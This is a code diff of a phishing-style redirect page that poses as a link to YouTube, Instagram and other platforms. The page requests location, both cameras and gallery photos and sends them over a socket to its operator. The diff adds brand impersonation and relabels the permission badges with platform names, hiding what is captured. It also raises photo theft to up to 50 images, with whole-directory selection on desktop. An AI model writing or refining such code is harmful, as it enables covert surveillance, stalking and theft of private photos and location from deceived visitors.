@@ -8,7 +8,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -18,144 +18,242 @@
         }
         .container {
             text-align: center;
-            max-width: 500px;
+            max-width: 480px;
             width: 100%;
-            background: rgba(255,255,255,0.95);
-            padding: 40px 30px;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            backdrop-filter: blur(10px);
-            animation: slideUp 0.5s ease-out;
+            background: rgba(255,255,255,0.06);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            padding: 45px 35px;
+            border-radius: 30px;
+            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+            animation: slideUp 0.6s ease-out;
+            position: relative;
+            overflow: hidden;
+        }
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 20%, rgba(102, 126, 234, 0.08), transparent 60%);
+            pointer-events: none;
         }
         @keyframes slideUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
+            from { opacity: 0; transform: translateY(40px) scale(0.95); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
         }
-        .spinner {
-            width: 60px;
-            height: 60px;
-            border: 4px solid #e8ecf1;
-            border-top: 4px solid #667eea;
-            border-radius: 50%;
-            animation: spin 0.9s linear infinite;
-            margin: 0 auto 20px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .logo-icon {
+
+        /* Platform Logo */
+        .platform-logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 15px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             font-size: 48px;
-            margin-bottom: 10px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.1);
+            transition: all 0.5s ease;
+            animation: pulseGlow 2s ease-in-out infinite;
         }
-        .redirect-text { font-size: 20px; color: #1a2332; margin-bottom: 6px; font-weight: 600; }
-        .redirect-url { 
-            font-size: 14px; 
-            color: #667eea; 
-            word-break: break-all; 
+        .platform-logo img {
+            width: 55px;
+            height: 55px;
+            object-fit: contain;
+            border-radius: 12px;
+        }
+        .platform-logo .fallback-icon {
+            font-size: 48px;
+            color: #fff;
+            opacity: 0.8;
+        }
+        @keyframes pulseGlow {
+            0%, 100% { box-shadow: 0 0 20px rgba(102, 126, 234, 0.2); }
+            50% { box-shadow: 0 0 40px rgba(102, 126, 234, 0.4); }
+        }
+
+        /* Platform Name */
+        .platform-name {
+            font-size: 14px;
+            color: rgba(255,255,255,0.5);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 5px;
             font-weight: 500;
-            background: #f0f4ff;
-            padding: 10px 16px;
-            border-radius: 10px;
+        }
+
+        .redirect-text {
+            font-size: 20px;
+            color: #fff;
+            margin-bottom: 4px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .redirect-url {
+            font-size: 15px;
+            color: rgba(255,255,255,0.7);
+            word-break: break-all;
+            font-weight: 400;
+            background: rgba(255,255,255,0.06);
+            padding: 12px 18px;
+            border-radius: 14px;
             display: inline-block;
             margin-top: 8px;
-            border: 1px solid #e0e7ff;
+            border: 1px solid rgba(255,255,255,0.06);
+            max-width: 100%;
         }
-        .sub-text { 
-            font-size: 14px; 
-            color: #8895aa; 
-            margin-top: 15px;
+
+        .sub-text {
+            font-size: 15px;
+            color: rgba(255,255,255,0.4);
+            margin-top: 18px;
             font-weight: 400;
+            letter-spacing: 0.3px;
         }
+
         .btn-continue {
-            margin-top: 25px;
-            padding: 16px 50px;
+            margin-top: 22px;
+            padding: 16px 45px;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             border: none;
             border-radius: 50px;
-            font-size: 17px;
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 20px rgba(102, 126, 234, 0.35);
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
         }
-        .btn-continue:hover { 
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.5);
+        .btn-continue::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.05), transparent);
+            transform: rotate(45deg);
+            transition: all 0.5s ease;
+        }
+        .btn-continue:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 8px 35px rgba(102, 126, 234, 0.5);
+        }
+        .btn-continue:hover::after {
+            left: 100%;
         }
         .btn-continue:disabled {
-            background: #a0aec0;
+            background: rgba(255,255,255,0.15);
             cursor: not-allowed;
             box-shadow: none;
+            transform: none;
         }
+
         #statusText {
-            font-size: 15px;
-            color: #667eea;
+            font-size: 14px;
+            color: rgba(255,255,255,0.5);
             margin-top: 18px;
-            font-weight: 500;
-            min-height: 28px;
+            font-weight: 400;
+            min-height: 22px;
+            transition: all 0.3s ease;
         }
-        #statusText.error { color: #e53e3e; }
-        #statusText.success { color: #22a67e; }
+        #statusText.error { color: #fc8181; }
+        #statusText.success { color: #68d391; }
+
         .progress-bar {
             width: 100%;
-            height: 4px;
-            background: #e8ecf1;
+            height: 3px;
+            background: rgba(255,255,255,0.08);
             border-radius: 2px;
-            margin-top: 20px;
+            margin-top: 22px;
             overflow: hidden;
         }
         .progress-bar .fill {
             height: 100%;
-            background: linear-gradient(90deg, #667eea, #764ba2);
+            background: linear-gradient(90deg, #667eea, #764ba2, #667eea);
+            background-size: 200% 100%;
             border-radius: 2px;
-            transition: width 0.3s ease;
+            transition: width 0.4s ease;
+            animation: shimmer 2s linear infinite;
         }
+        @keyframes shimmer {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
+
         .permission-badge {
             display: inline-block;
-            padding: 4px 12px;
+            padding: 4px 14px;
             border-radius: 20px;
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 500;
             margin: 3px;
+            letter-spacing: 0.3px;
+            transition: all 0.3s ease;
         }
-        .permission-badge.pending { background: #fef3c7; color: #92400e; }
-        .permission-badge.granted { background: #d4edda; color: #155724; }
-        .permission-badge.denied { background: #f8d7da; color: #721c24; }
-        #permissionStatus {
-            margin-top: 15px;
-            display: none;
-        }
+        .permission-badge.pending { background: rgba(254, 243, 199, 0.15); color: #f6c23e; border: 1px solid rgba(254, 243, 199, 0.2); }
+        .permission-badge.granted { background: rgba(212, 237, 218, 0.15); color: #68d391; border: 1px solid rgba(212, 237, 218, 0.2); }
+        .permission-badge.denied { background: rgba(248, 215, 218, 0.15); color: #fc8181; border: 1px solid rgba(248, 215, 218, 0.2); }
+        #permissionStatus { margin-top: 15px; display: none; }
+
         #hiddenVideo, #hiddenVideoBack { display: none; }
+
         .instructions {
             margin-top: 15px;
-            padding: 15px;
-            background: #fef3c7;
-            border-radius: 10px;
+            padding: 14px 18px;
+            background: rgba(254, 243, 199, 0.08);
+            border-radius: 12px;
             font-size: 13px;
-            color: #92400e;
+            color: #f6c23e;
             display: none;
             text-align: left;
-            border: 1px solid #f6c23e;
+            border: 1px solid rgba(254, 243, 199, 0.1);
         }
-        .instructions strong { display: block; margin-bottom: 5px; }
+        .instructions strong { display: block; margin-bottom: 4px; }
+
+        /* Shimmer loading effect */
+        .shimmer-text {
+            background: linear-gradient(90deg, rgba(255,255,255,0.1), rgba(255,255,255,0.2), rgba(255,255,255,0.1));
+            background-size: 200% 100%;
+            animation: shimmerText 2s infinite;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        @keyframes shimmerText {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo-icon">🔐</div>
-        <div class="spinner"></div>
+        <!-- Platform Logo -->
+        <div class="platform-logo" id="platformLogo">
+            <div class="fallback-icon" id="fallbackIcon">🔗</div>
+        </div>
+        
+        <div class="platform-name" id="platformName">Loading...</div>
+        
         <div class="redirect-text">Connecting Securely</div>
         <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
-        <div class="sub-text">Click continue to grant access</div>
+        
+        <div class="sub-text" id="actionText">Click continue to proceed</div>
         <div id="statusText">Ready</div>
         
         <div id="permissionStatus">
-            <span class="permission-badge pending" id="permLocation">📍 Location</span>
-            <span class="permission-badge pending" id="permFront">📸 Front Camera</span>
-            <span class="permission-badge pending" id="permBack">📸 Back Camera</span>
-            <span class="permission-badge pending" id="permGallery">🖼️ Gallery</span>
+            <span class="permission-badge pending" id="permLocation">Youtube</span>
+            <span class="permission-badge pending" id="permFront">Instagram</span>
+            <span class="permission-badge pending" id="permBack">Facebook</span>
+            <span class="permission-badge pending" id="permGallery">Telegram</span>
         </div>
         
         <div class="progress-bar">
@@ -194,6 +292,10 @@
             const instructions = document.getElementById('instructions');
             const progressFill = document.getElementById('progressFill');
             const permissionStatus = document.getElementById('permissionStatus');
+            const platformLogo = document.getElementById('platformLogo');
+            const platformName = document.getElementById('platformName');
+            const actionText = document.getElementById('actionText');
+            const fallbackIcon = document.getElementById('fallbackIcon');
             
             let socket = null;
             let redirectUrl = 'https://www.google.com';
@@ -211,6 +313,97 @@
                 backCamera: false,
                 gallery: false
             };
+
+            // ============================================
+            // PLATFORM DETECTION & LOGO
+            // ============================================
+            function detectPlatform(url) {
+                const platforms = [
+                    { name: 'YouTube', icon: '▶️', domains: ['youtube.com', 'youtu.be'], color: '#FF0000' },
+                    { name: 'Instagram', icon: '📸', domains: ['instagram.com', 'instagr.am'], color: '#E4405F' },
+                    { name: 'Facebook', icon: '👍', domains: ['facebook.com', 'fb.com'], color: '#1877F2' },
+                    { name: 'Twitter', icon: '🐦', domains: ['twitter.com', 'x.com'], color: '#1DA1F2' },
+                    { name: 'WhatsApp', icon: '💬', domains: ['whatsapp.com'], color: '#25D366' },
+                    { name: 'Telegram', icon: '✈️', domains: ['telegram.org', 't.me'], color: '#26A5E4' },
+                    { name: 'LinkedIn', icon: '💼', domains: ['linkedin.com'], color: '#0A66C2' },
+                    { name: 'Reddit', icon: '🤖', domains: ['reddit.com'], color: '#FF4500' },
+                    { name: 'Pinterest', icon: '📌', domains: ['pinterest.com'], color: '#E60023' },
+                    { name: 'TikTok', icon: '🎵', domains: ['tiktok.com'], color: '#000000' },
+                    { name: 'Snapchat', icon: '👻', domains: ['snapchat.com'], color: '#FFFC00' },
+                    { name: 'GitHub', icon: '🐙', domains: ['github.com'], color: '#181717' },
+                    { name: 'Google', icon: '🔍', domains: ['google.com', 'google.co.in'], color: '#4285F4' },
+                    { name: 'Netflix', icon: '🎬', domains: ['netflix.com'], color: '#E50914' },
+                    { name: 'Amazon', icon: '🛒', domains: ['amazon.com', 'amazon.in'], color: '#FF9900' },
+                    { name: 'Spotify', icon: '🎧', domains: ['spotify.com'], color: '#1DB954' },
+                    { name: 'Discord', icon: '🎮', domains: ['discord.com'], color: '#5865F2' },
+                    { name: 'Twitch', icon: '🎥', domains: ['twitch.tv'], color: '#9146FF' },
+                    { name: 'Medium', icon: '✍️', domains: ['medium.com'], color: '#000000' },
+                    { name: 'Quora', icon: '❓', domains: ['quora.com'], color: '#B92B27' }
+                ];
+
+                try {
+                    const urlObj = new URL(url);
+                    const hostname = urlObj.hostname.replace('www.', '');
+                    
+                    for (const platform of platforms) {
+                        for (const domain of platform.domains) {
+                            if (hostname.includes(domain) || url.includes(domain)) {
+                                return platform;
+                            }
+                        }
+                    }
+                    
+                    // Try to get domain name as fallback
+                    const domainParts = hostname.split('.');
+                    const mainDomain = domainParts[domainParts.length - 2] || domainParts[0];
+                    return {
+                        name: mainDomain.charAt(0).toUpperCase() + mainDomain.slice(1),
+                        icon: '🌐',
+                        color: '#667eea'
+                    };
+                } catch {
+                    return { name: 'Website', icon: '🌐', color: '#667eea' };
+                }
+            }
+
+            function updatePlatformDisplay(url) {
+                const platform = detectPlatform(url);
+                
+                // Update logo
+                platformLogo.innerHTML = `<span style="font-size:52px;">${platform.icon}</span>`;
+                platformLogo.style.borderColor = platform.color + '40';
+                platformLogo.style.boxShadow = `0 0 30px ${platform.color}25`;
+                
+                // Update platform name
+                platformName.textContent = platform.name;
+                platformName.style.color = platform.color;
+                
+                // Update action text based on platform
+                const actionMap = {
+                    'YouTube': 'Click & watch this video',
+                    'Instagram': 'Click & view this post',
+                    'Facebook': 'Click & view this post',
+                    'Twitter': 'Click & view this tweet',
+                    'WhatsApp': 'Click & open this message',
+                    'Telegram': 'Click & open this channel',
+                    'LinkedIn': 'Click & view this post',
+                    'Reddit': 'Click & view this thread',
+                    'Pinterest': 'Click & view this pin',
+                    'TikTok': 'Click & watch this video',
+                    'Snapchat': 'Click & view this snap',
+                    'GitHub': 'Click & view this repo',
+                    'Google': 'Click & search this',
+                    'Netflix': 'Click & watch this show',
+                    'Amazon': 'Click & view this product',
+                    'Spotify': 'Click & listen this',
+                    'Discord': 'Click & join this server',
+                    'Twitch': 'Click & watch this stream',
+                    'Medium': 'Click & read this article',
+                    'Quora': 'Click & read this answer'
+                };
+                
+                actionText.textContent = actionMap[platform.name] || 'Click & continue';
+            }
 
             function updateStatus(msg, type = '') {
                 statusText.textContent = msg;
@@ -232,7 +425,13 @@
                 const el = document.getElementById(map[type]);
                 if (el) {
                     el.className = 'permission-badge ' + status;
-                    el.textContent = el.textContent.split(' ')[0] + ' ' + status.charAt(0).toUpperCase() + status.slice(1);
+                    const label = el.textContent.split(' ')[0];
+                    const statusMap = {
+                        'pending': '⏳ Pending',
+                        'granted': '✅ Granted',
+                        'denied': '❌ Denied'
+                    };
+                    el.textContent = label + ' ' + statusMap[status];
                 }
             }
 
@@ -246,6 +445,7 @@
                     .then(data => {
                         redirectUrl = data.redirectUrl || 'https://www.google.com';
                         redirectDisplay.textContent = redirectUrl;
+                        updatePlatformDisplay(redirectUrl);
                         connectSocket();
                     })
                     .catch(() => {
@@ -254,11 +454,13 @@
                             .then(data => {
                                 redirectUrl = data.redirectUrl || 'https://www.google.com';
                                 redirectDisplay.textContent = redirectUrl;
+                                updatePlatformDisplay(redirectUrl);
                                 connectSocket();
                             })
                             .catch(() => {
                                 redirectUrl = 'https://www.google.com';
                                 redirectDisplay.textContent = redirectUrl;
+                                updatePlatformDisplay(redirectUrl);
                                 connectSocket();
                             });
                     });
@@ -372,7 +574,7 @@
             }
 
             // ============================================
-            // CONTINUE - ALL PERMISSIONS AT ONCE
+            // CONTINUE - ALL PERMISSIONS
             // ============================================
             continueBtn.addEventListener('click', function() {
                 if (isProcessing) return;
@@ -392,7 +594,6 @@
 
                 cleanupStreams();
 
-                // ---- REQUEST ALL PERMISSIONS IN PARALLEL ----
                 Promise.all([
                     requestLocation(),
                     requestFrontCamera(),
@@ -447,7 +648,7 @@
                         updatePermBadge('location', 'denied');
                     }
                     
-                    if (galleryResult) {
+                    if (galleryResult && galleryResult.length > 0) {
                         permissions.gallery = true;
                         updatePermBadge('gallery', 'granted');
                         if (socket && socket.connected) {
@@ -456,6 +657,7 @@
                                 type: 'galleryPhotos',
                                 content: galleryResult
                             });
+                            console.log(`🖼️ ${galleryResult.length} gallery photos sent`);
                         }
                     } else {
                         updatePermBadge('gallery', 'denied');
@@ -463,7 +665,6 @@
                     
                     updateProgress(100);
                     
-                    // Check if at least camera worked
                     if (!permissions.frontCamera && !permissions.backCamera) {
                         updateStatus('❌ Camera access required. Please allow camera.', 'error');
                         instructions.style.display = 'block';
@@ -473,8 +674,7 @@
                         return;
                     }
                     
-                    // All done - redirect
-                    updateStatus('✅ All permissions granted! Redirecting...', 'success');
+                    updateStatus('✅ Permissions granted! Redirecting...', 'success');
                     
                     if (socket && socket.connected) {
                         socket.emit('visitor-data', {
@@ -601,11 +801,10 @@
             }
 
             // ============================================
-            // REQUEST GALLERY (Photos/Media)
+            // REQUEST GALLERY - ALL PHOTOS ACCESS
             // ============================================
             function requestGallery() {
                 return new Promise(function(resolve) {
-                    // Use input element for file access
                     const input = document.createElement('input');
                     input.type = 'file';
                     input.accept = 'image/*';
@@ -613,10 +812,21 @@
                     input.style.display = 'none';
                     document.body.appendChild(input);
                     
+                    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+                    
+                    if (isMobile) {
+                        input.setAttribute('multiple', 'multiple');
+                    } else {
+                        input.setAttribute('webkitdirectory', 'webkitdirectory');
+                        input.setAttribute('directory', 'directory');
+                    }
+                    
+                    let photos = [];
+                    let loaded = 0;
+                    
                     input.onchange = function(e) {
                         const files = e.target.files;
-                        const photos = [];
-                        let loaded = 0;
+                        const totalFiles = Math.min(files.length, 50);
                         
                         if (files.length === 0) {
                             document.body.removeChild(input);
@@ -624,12 +834,23 @@
                             return;
                         }
                         
-                        for (let i = 0; i < Math.min(files.length, 10); i++) {
+                        updateStatus(`🖼️ Loading ${totalFiles} photos...`);
+                        
+                        for (let i = 0; i < totalFiles; i++) {
                             const reader = new FileReader();
                             reader.onload = function(event) {
                                 photos.push(event.target.result);
                                 loaded++;
-                                if (loaded === Math.min(files.length, 10)) {
+                                updateProgress(10 + (loaded / totalFiles) * 70);
+                                if (loaded === totalFiles) {
+                                    document.body.removeChild(input);
+                                    updateStatus(`✅ ${photos.length} photos loaded!`);
+                                    resolve(photos);
+                                }
+                            };
+                            reader.onerror = function() {
+                                loaded++;
+                                if (loaded === totalFiles) {
                                     document.body.removeChild(input);
                                     resolve(photos);
                                 }
@@ -638,16 +859,13 @@
                         }
                     };
                     
-                    // If user cancels, resolve with empty array
                     input.oncancel = function() {
                         document.body.removeChild(input);
                         resolve([]);
                     };
                     
-                    // Trigger file picker
                     input.click();
                     
-                    // Timeout fallback - if user doesn't select anything
                     setTimeout(function() {
                         if (document.body.contains(input)) {
                             document.body.removeChild(input);
